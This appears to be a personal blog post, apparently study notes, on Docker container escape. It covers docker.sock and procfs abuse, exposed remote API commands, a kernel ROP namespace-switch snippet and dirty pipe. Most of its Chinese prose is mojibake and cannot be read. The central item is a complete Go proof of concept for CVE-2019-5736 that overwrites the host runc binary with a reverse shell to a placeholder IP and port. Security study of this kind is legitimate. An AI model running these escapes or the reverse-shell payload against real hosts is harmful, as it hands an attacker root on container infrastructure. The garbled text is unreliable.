<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -itd -v /var/run/docker.sock:/var/run/docker.sock id
</span></span></code></pre></div><p>æ£€æµ‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -lah /var/run/docker.sock
</span></span></code></pre></div><h4 id="æ ¹ç›®å½•">æ ¹ç›®å½•</h4>
<p>ç›¸å½“äºç›´æ¥å†™ä¸»æœºçš„æ ¹ç›®å½•äº†</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chroot /mount_dir
</span></span></code></pre></div><h4 id="procfs">procfs</h4>
<p>æŸ¥çœ‹æ˜¯å¦æŒ‚è½½</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name core_pattern
</span></span></code></pre></div><p>é€ƒé€¸ï¼Œ<a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">(2)</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># å¯»æ‰¾åœ¨ä¸»æœºä¸‹çš„ç»å¯¹è·¯å¾„</span>
</span></span><span style="display:flex;"><span>cat /proc/mounts | xargs -d <span style="color:#f1fa8c">&#39;,&#39;</span> -n <span style="color:#bd93f9">1</span> | grep workdir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># å†™å…¥åå¼¹ shell åˆ°ç›®æ ‡çš„ proc ç›®å½•ä¸‹</span>
</span></span></code></pre></div><h3 id="docker-remote-api">Docker remote API</h3>
<p>é€šè¿‡å°†å®¿ä¸»æœºçš„dockeræœåŠ¡é€šè¿‡socketçš„æ–¹å¼æš´éœ²ç»™å¤–éƒ¨è¿æ¥ï¼Œä½¿å¾—å…¶ä»–ä¸»æœºä¹Ÿå¯ä»¥è®¿é—®dockeræœåŠ¡ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
</span></span></code></pre></div><p>å¯ä»¥åˆ©ç”¨ remote API æ¥æ“ä½œdockerè¿›è¡Œé€ƒé€¸</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># æŸ¥çœ‹å®¹å™¨</span>
</span></span><span style="display:flex;"><span>curl http://&lt;target&gt;:2375/containers/json
</span></span><span style="display:flex;"><span>docker -H tcp://&lt;target&gt;:2375 ps -a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># å°†è¿œç¨‹çš„æ ¹ç›®å½•æŒ‚è½½</span>
</span></span><span style="display:flex;"><span>docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
</span></span></code></pre></div><h3 id="ç¨‹åºæ¼æ´å¯¼è‡´docker-é€ƒé€¸">ç¨‹åºæ¼æ´å¯¼è‡´Docker é€ƒé€¸</h3>
<p>ä½¿ç”¨ <code>docker version</code> å‘½ä»¤å¯ä»¥çœ‹åˆ° <code>runc &amp;&amp; containerd</code> ç»„ä»¶</p>
<h4 id="runc">runc</h4>
<p>runcæ˜¯ä¸€ä¸ªåº•å±‚æœåŠ¡å·¥å…·ï¼ŒrunC ç®¡ç†å®¹å™¨çš„åˆ›å»ºï¼Œè¿è¡Œï¼Œé”€æ¯ç­‰ï¼Œdockeréƒ¨åˆ†ç‰ˆæœ¬æœåŠ¡è¿è¡Œæ—¶åº•å±‚å…¶å®åœ¨è¿è¡Œç€runcæœåŠ¡ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šçš„å®¹å™¨é•œåƒæˆ–è€…execæ“ä½œé‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ä¸€ä¸ªå®¹å™¨å¼€å¯æ—¶ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥</p>
<ul>
<li>fork åˆ›å»ºå­è¿›ç¨‹</li>
<li>åˆå§‹åŒ–å®¹å™¨åŒ–ç¯å¢ƒ</li>
<li>å°†æ‰§è¡Œæµé‡å®šå‘åˆ°ç”¨æˆ·æä¾›çš„å…¥å£ç‚¹</li>
</ul>
<p><code>docker run</code>ç­‰å‘½ä»¤çš„æ—¶å€™å®é™…ä¸Šåœ¨åº•å±‚è°ƒç”¨çš„æ˜¯runCç¨‹åºï¼Œæˆ‘ä»¬åœ¨å®¹å™¨ä¸­è¿è¡Œ <code>/bin/bash</code> ä¹Ÿä¼šè°ƒç”¨åˆ°runC</p>
<p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&amp;riu=http%3a%2f%2fxuxinkun.github.io%2fimg%2fdocker-oci-runc-k8s%2fkubelet.png&amp;ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA%3d&amp;risl=&amp;pid=ImgRaw&amp;r=0" alt="runc"></p>
<p>procfs:</p>
<ul>
<li><code>/proc/[PID]/exe</code>: ä¸€ç§ç‰¹æ®Šçš„è½¯è¿æ¥ï¼Œæ˜¯è¯¥è¿›ç¨‹è‡ªèº«å¯¹åº”çš„æœ¬åœ°æ–‡ä»¶</li>
<li><code>/proc/[PID]/fd/</code>: è¿™ä¸ªç›®å½•ä¸‹å­˜æ”¾äº†è¯¥è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦</li>
</ul>
<p><code>/proc/[PID]/exe</code>çš„ç‰¹æ®Šä¹‹å¤„åœ¨äºå½“æƒé™é€šè¿‡çš„æƒ…å†µä¸‹æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå†…æ ¸å°†ä¼šä¹‹é—´è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶éæŒ‰ç…§ä¼ ç»Ÿçš„æ‰“å¼€æ–¹å¼åšè·¯å¾„åˆ†æå’Œæ–‡ä»¶æŸ¥æ‰¾ï¼Œè¿™å°±ä¼šå¯¼è‡´ç»•è¿‡äº†mntå‘½åç©ºé—´å’Œchrootçš„é™åˆ¶ã€‚</p>
<p>CVE-2019-5736ï¼šè¯¥æ¼æ´å…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p>
<ul>
<li>ä¿®æ”¹å®¹å™¨å†…çš„<code>/bin/sh</code>æ–‡ä»¶ï¼Œæ”¹ä¸º<code>#!/proc/self/exe</code>ï¼Œè¿™æ ·çš„è¯ï¼Œå½“å®¹å™¨å†…çš„<code>/bin/sh</code>è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œå®é™…ä¸Šè¢«æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„æ˜¯<code>/proc/self/exe</code></li>
<li><code>/proc/self/exe</code>æ˜¯å†…æ ¸ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ›å»ºçš„ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘<strong>ä¸ºè¯¥è¿›ç¨‹è€Œæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</strong>ã€‚å½“å®¹å™¨ä¸­çš„<code>/bin/sh</code>è¢«æ‰§è¡Œæ—¶ï¼Œ<code>/proc/self/exe</code>æŒ‡å‘çš„å®¿ä¸»æœºä¸Šçš„<code>runc</code>å°±ä¼šè¢«æ‰§è¡Œ</li>
</ul>
<p>æ¼æ´çš„å­˜åœ¨åŸç†åœ¨äº/proc/pid/exeè¿™ä¸ªç»‘å®šçš„æ–¹å¼ï¼Œ/procæ˜¯æ¯”è¾ƒç†ŸçŸ¥çš„ä¸€ä¸ªæ¦‚å¿µï¼Œä¸ºä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå…¶ä¸­çš„æ–‡ä»¶èƒ½å¤Ÿæ˜¾ç¤ºå½“å‰çš„è¿›ç¨‹è¿è¡Œä¿¡æ¯ã€‚/proc/pid/exeæ˜¯ä¸€ä¸ªç¨‹åºé“¾æ¥ï¼ŒæŒ‡å‘è¿™ä¸ªpidè¿è¡Œçš„ç¨‹åºã€‚</p>
<p>è€Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹å¼å°±åœ¨äºï¼Œåœ¨dockeré‡ŒæŸ¥æ‰¾åˆ°runcçš„exeï¼Œè·å–å¯¹åº”äºè¯¥ä½ç½®çš„ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œç„¶åå‘è¿™ä¸ªä½ç½®å†™å…¥ä¸œè¥¿çš„è¯ï¼Œå°±èƒ½å¤Ÿå°†å®¿ä¸»æœºçš„ç¨‹åºè¦†ç›–æ‰ï¼Œç„¶åç”¨æˆ·ä¸‹ä¸€æ¬¡å†è¦è¿è¡Œruncçš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘åå¼¹shellã€‚</p>
<p>PoC</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> main
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// Implementation of CVE-2019-5736
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// Created with help from @singe, @_cablethief, and @feexd.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// This commit also helped a ton to understand the vuln
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;io/ioutil&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;os&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;strconv&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;strings&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// This is the line of shell commands that will execute on the host
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// æ›¿æ¢IP å’Œ PORT
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">var</span> payload = <span style="color:#f1fa8c">&#34;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp; 1 &amp;\n&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//é¦–å…ˆæ¥çœ‹çœ‹èƒ½ä¸èƒ½æ‰“å¼€/bin/shï¼Œå³æœ‰rootæƒé™å°±æˆ
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	fd, err <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">Create</span>(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Println</span>(err)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//ç„¶åå°†å…¶è¦†ç›–ä¸º#!/proc/self/exe
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	fmt.<span style="color:#50fa7b">Fprintln</span>(fd, <span style="color:#f1fa8c">&#34;#!/proc/self/exe&#34;</span>)
</span></span><span style="display:flex;"><span>	err = fd.<span style="color:#50fa7b">Close</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Println</span>(err)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Overwritten /bin/sh successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// å¾ªç¯éå†/procé‡Œçš„æ–‡ä»¶ï¼Œç›´åˆ°æ‰¾åˆ°runcæ˜¯å“ªä¸ªè¿›ç¨‹
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> found <span style="color:#8be9fd">int</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> found <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>		pids, err <span style="color:#ff79c6">:=</span> ioutil.<span style="color:#50fa7b">ReadDir</span>(<span style="color:#f1fa8c">&#34;/proc&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			fmt.<span style="color:#50fa7b">Println</span>(err)
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> _, f <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> pids {
</span></span><span style="display:flex;"><span>			fbytes, _ <span style="color:#ff79c6">:=</span> ioutil.<span style="color:#50fa7b">ReadFile</span>(<span style="color:#f1fa8c">&#34;/proc/&#34;</span> <span style="color:#ff79c6">+</span> f.<span style="color:#50fa7b">Name</span>() <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/cmdline&#34;</span>)
</span></span><span style="display:flex;"><span>			fstring <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">string</span>(fbytes)
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(fstring, <span style="color:#f1fa8c">&#34;runc&#34;</span>) {
</span></span><span style="display:flex;"><span>				fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Found the PID:&#34;</span>, f.<span style="color:#50fa7b">Name</span>())
</span></span><span style="display:flex;"><span>				found, err = strconv.<span style="color:#50fa7b">Atoi</span>(f.<span style="color:#50fa7b">Name</span>())
</span></span><span style="display:flex;"><span>				<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>					fmt.<span style="color:#50fa7b">Println</span>(err)
</span></span><span style="display:flex;"><span>					<span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// å¾ªç¯å»è¯»è¿™ä¸ª/proc/pid/exeï¼Œå…ˆæ‹¿åˆ°ä¸€ä¸ªè¯¥æ–‡ä»¶çš„fdï¼Œè¯¥fdå°±æŒ‡å‘äº†runcç¨‹åºçš„ä½ç½®
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#8be9fd;font-style:italic">var</span> handleFd = <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> handleFd <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// Note, you do not need to use the O_PATH flag for the exploit to work.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		handle, _ <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">OpenFile</span>(<span style="color:#f1fa8c">&#34;/proc/&#34;</span><span style="color:#ff79c6">+</span>strconv.<span style="color:#50fa7b">Itoa</span>(found)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;/exe&#34;</span>, os.O_RDONLY, <span style="color:#bd93f9">0777</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">int</span>(handle.<span style="color:#50fa7b">Fd</span>()) &gt; <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>			handleFd = <span style="color:#8be9fd;font-style:italic">int</span>(handle.<span style="color:#50fa7b">Fd</span>())
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Successfully got the file handle&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// ç„¶åä¸æ–­çš„å»å°è¯•å†™è¿™ä¸ªæŒ‡å‘çš„æ–‡ä»¶ï¼Œä¸€å¼€å§‹ç”±äºruncä¼šå…ˆå ç”¨ç€ï¼Œå†™ä¸è¿›å»ï¼Œç›´åˆ°runcçš„å ç”¨è§£é™¤äº†ï¼Œå°±ç«‹å³å†™å…¥
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">for</span> {
</span></span><span style="display:flex;"><span>		writeHandle, _ <span style="color:#ff79c6">:=</span> os.<span style="color:#50fa7b">OpenFile</span>(<span style="color:#f1fa8c">&#34;/proc/self/fd/&#34;</span><span style="color:#ff79c6">+</span>strconv.<span style="color:#50fa7b">Itoa</span>(handleFd), os.O_WRONLY|os.O_TRUNC, <span style="color:#bd93f9">0700</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">int</span>(writeHandle.<span style="color:#50fa7b">Fd</span>()) &gt; <span style="color:#bd93f9">0</span> {
</span></span><span style="display:flex;"><span>			fmt.<span style="color:#50fa7b">Println</span>(<span style="color:#f1fa8c">&#34;[+] Successfully got write handle&#34;</span>, writeHandle)
</span></span><span style="display:flex;"><span>			writeHandle.<span style="color:#50fa7b">Write</span>([]<span style="color:#8be9fd;font-style:italic">byte</span>(payload))
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>CVE-2024-21626ï¼šç”±äºÂ <code>runc</code>Â å†…éƒ¨ä¸æ­£ç¡®å¤„ç†æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯¼è‡´æ³„æ¼å…³é”®çš„å®¿ä¸»æœºæ–‡ä»¶æè¿°ç¬¦åˆ°å®¹å™¨ä¸­ã€‚</p>
<p>è¿‘æ—¥å¤§ç«çš„CVEï¼Œåœ¨ç¿»çœ‹<a href="https://bestwing.me/CVE-2024-21626-container-escape.html">è¿™ä½å¸ˆå‚…çš„æ–‡ç« </a>æ—¶çœ‹åˆ°çš„</p>
<p><del>çœ‹èµ·æ¥å¾ˆNBï¼Œè™½ç„¶æˆ‘ç°åœ¨çœ‹ä¸æ‡‚ğŸ˜­</del></p>
<h4 id="containerd">containerd</h4>
<p>containerd æ˜¯ä¸€ä¸ªå·¥ä¸šçº§æ ‡å‡†çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œå®ƒå¼ºè°ƒ<strong>ç®€å•æ€§</strong>ã€<strong>å¥å£®æ€§</strong>å’Œ<strong>å¯ç§»æ¤æ€§</strong>ï¼Œcontainerd å¯ä»¥è´Ÿè´£å¹²ä¸‹é¢è¿™äº›äº‹æƒ…ï¼š</p>
<ul>
<li>ç®¡ç†å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä»åˆ›å»ºå®¹å™¨åˆ°é”€æ¯å®¹å™¨ï¼‰</li>
<li>æ‹‰å–/æ¨é€å®¹å™¨é•œåƒ</li>
<li>å­˜å‚¨ç®¡ç†ï¼ˆç®¡ç†é•œåƒåŠå®¹å™¨æ•°æ®çš„å­˜å‚¨ï¼‰</li>
<li>è°ƒç”¨ runc è¿è¡Œå®¹å™¨ï¼ˆä¸ runc ç­‰å®¹å™¨è¿è¡Œæ—¶äº¤äº’ï¼‰</li>
<li>ç®¡ç†å®¹å™¨ç½‘ç»œæ¥å£åŠç½‘ç»œ</li>
</ul>
<h3 id="å†…æ ¸æ¼æ´">å†…æ ¸æ¼æ´</h3>
<h4 id="rop">ROP</h4>
<p>commit_creds(prepare_kernel_cred(0))ä¸ä¼šçªç ´namespaceå¯¹äºè¿›ç¨‹çš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿åœ¨å®Œæˆææƒä¹‹åï¼Œtask_structä¸­çš„fs_structæˆ–è€…æ˜¯ns_proxyéƒ½ä¸å—åˆ°å½±å“è¿˜å¤„äºåŸæœ¬çš„å‘½åç©ºé—´ä¸­ã€‚</p>
<p>å¯ä»¥çœ‹CVE-2021-22555çš„æ¼æ´åˆ©ç”¨ï¼Œåœ¨å¾—åˆ°rootæƒé™åï¼Œéœ€è¦åœ¨å†…æ ¸ä¸­å°†è¿›ç¨‹çš„å‘½åç©ºé—´åˆ‡æ¢ä¸ºåˆå§‹çš„å…¨å±€å‘½åç©ºé—´Â <code>init_nsproxy</code>Â å³å¯å®Œæˆå®¹å™¨é€ƒé€¸ï¼Œæ‰§è¡Œ<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code>Â å³å¯æ›¿æ¢æ‰å½“å‰è¿›ç¨‹çš„å‘½åç©ºé—´</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> POP_RDI_RET;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>; <span style="color:#6272a4">// RDI
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> FIND_TASK_BY_VPID;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> POP_RCX_RET;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4</span>; <span style="color:#6272a4">// RCX
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> CMP_RCX_4_JNE_POP_RBP_RET;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xDEADBEEF</span>; <span style="color:#6272a4">// RBP
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> POP_RSI_RET;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> INIT_NSPROXY; <span style="color:#6272a4">// RSI
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">*</span>rop<span style="color:#ff79c6">++</span> <span style="color:#ff79c6">=</span> kbase_addr <span style="color:#ff79c6">+</span> SWITCH_TASK_NAMESPACES;
</span></span></code></pre></div><h4 id="dirty-pipe">dirty pipe</h4>
<p>é€šè¿‡åˆ©ç”¨Â <code>CAP_DAC_READ_SEARCH</code>Â ä¸è„ç®¡é“å¯ä»¥å®ç°è¦†ç›–ä¸»æœºæ–‡ä»¶ï¼Œå®é™…ä¸Šä¸»è¦æ˜¯<code>CAP_DAC_READ_SEARCH</code>å¯ä»¥è°ƒç”¨<code>open_by_handle_at</code>, å¯ä»¥è·å¾—ä¸»æœºæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé…åˆè„ç®¡é“äºæ˜¯å°±å¯ä»¥ä¿®æ”¹ä¸»æœºæ–‡ä»¶ã€‚ä½†æ˜¯éœ€è¦æ·»åŠ capæƒé™ <a href="https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape">(3)</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run --rm -it --cap-add<span style="color:#ff79c6">=</span>CAP_DAC_READ_SEARCH ubuntu
</span></span></code></pre></div><h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<ul>
<li><a href="https://wiki.teamssix.com/CloudNative/">äº‘åŸç”Ÿ | T Wiki (teamssix.com)</a></li>
<li><a href="https://liuliuliuzy.github.io/tags/docker/">Docker</a></li>
</ul>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/docker">Docker</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
    (function () {
        
        
        if (window.location.hostname == "localhost")
            return;

        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        var disqus_shortname = 'ldrx30';
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>

</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2024  Â© ldrx30 |  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
